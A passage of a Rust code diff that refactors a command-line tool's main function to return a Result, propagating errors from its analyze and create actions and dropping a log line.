         println!("You need to supply an action. Run with {} for more information.", "--help".green());
-        return;
+        return Ok(());
     }
 
-    info!("Opening {}...", args.path);
     let path = path::Path::new(&args.path);
 
     if args.analyze {
-        analyze(&path);
+        analyze(&path)?;
     } else if args.create {
-        create(&path);
+        create(&path)?;
     }
+
+    Ok(())
 }
